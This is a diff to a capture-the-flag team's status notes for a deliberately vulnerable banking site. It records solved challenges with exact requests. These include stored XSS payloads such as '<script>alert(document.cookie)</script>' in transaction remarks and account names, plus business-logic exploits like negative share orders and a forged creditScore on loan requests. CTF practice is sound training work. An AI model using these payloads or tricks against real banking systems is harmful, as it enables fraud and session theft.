@@ -1,7 +1,7 @@
 # DarkMoney CTF — Status & Solutions
 
-**Competition:** Schwab 2026 Advanced | **Team score:** 1410 | **Team rank:** improving  
-**Progress:** 11 of 37 challenges solved  
+**Competition:** Schwab 2026 Advanced | **Team score:** 1710 | **Team rank:** improving  
+**Progress:** 13 of 37 challenges solved  
 **Target:** https://50-18-145-16-darkmoneyprod.vulnerablesites.net  
 **Tracker:** https://crwd-ctrl.net/d9e8f33f-db5e-405c-8236-499d2f0df794  
 **Account:** Alice Morgan (user ID 1, clientId DM-CLIENT-A9F131)
@@ -23,22 +23,18 @@
 | A Tribute in Reverse | Trex | 100 | Negative shares on `POST /api/oracle/markets/{id}/orders` → money flows TO us |
 | Name Your Price | Trex | 150 | Custom `entryPriceCents: 1` on oracle bet — pay 1¢ per share instead of market price |
 | Borrowed Confidence | Trex | 320 | Business logic flaw — submit loan with fake creditScore: 850; server accepts without verification |
+| Say It Again | Trex | 100 | Stored XSS — `POST /api/transactions` with XSS in `remarks`, then `GET /api/transactions/statement/print` renders it |
+| By Any Other Name | Trex | 200 | Stored XSS in account displayName — `POST /api/accounts` with `displayName: '<script>alert(1)</script>'` |
 
-**Total earned: 1410 pts**
+**Total earned: 1710 pts**
 
 ---
 
 ## 🔄 IN PROGRESS (incomplete challenges)
 
-### Say It Again (Trex)
-- **Vector:** Stored XSS in transfer memo/remarks field → rendered in statement print
-- **Hint:** "Slip it a memo it isn't expecting. Then ask the bank to print the record out and watch who's actually reading along."
-- **Steps:**
-  1. POST transfer via `/api/transfers` with remarks = XSS payload
-  2. `GET /api/transactions/statement/print` renders memo unsanitized in HTML
-  3. Need to find exact endpoint and field name for transfer remarks
-- **Payloads to try:** `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
-- **crwd-ctrl SUBMIT type:** probably text flag or file upload
+### The Prophecy That Speaks (Trex) — newly unlocked
+- **Vector:** Unknown — just unlocked; need to read description on crwd-ctrl
+- **Status:** Not yet investigated
 
 ### Honest Answers (Alpaca)
 - **Vector:** SQL injection in transaction search field
@@ -121,6 +117,16 @@ Additional challenges are still locked (unlock by completing prerequisites):
 - `POST /api/loans` with `{"loanType":"PERSONAL","loanAmount":25000,"creditScore":850}`
 - Server accepts caller-supplied creditScore without verification → loan approved instantly
 - crwd-ctrl auto-detected when the loan was approved
+
+### Say It Again — 100 pts
+- `POST /api/transactions` with `{"fromAccountNo":"DMACC1001","toAccountNo":"DMACC1006","amount":1,"remarks":"<script>alert(document.cookie)</script>"}`
+- Then `GET /api/transactions/statement/print` renders remarks field unsanitized in HTML
+- crwd-ctrl auto-detected on the statement print request
+
+### By Any Other Name — 200 pts
+- `POST /api/accounts` with `{"productId":"high-yield-savings","openingDeposit":100,"fundingType":"INTERNAL","fromAccountNo":"DMACC1001","displayName":"<script>alert(1)</script>"}`
+- Server stores XSS payload in account displayName — form UI never allows custom names
+- crwd-ctrl auto-detected when accounts page loaded
 
 ---
 
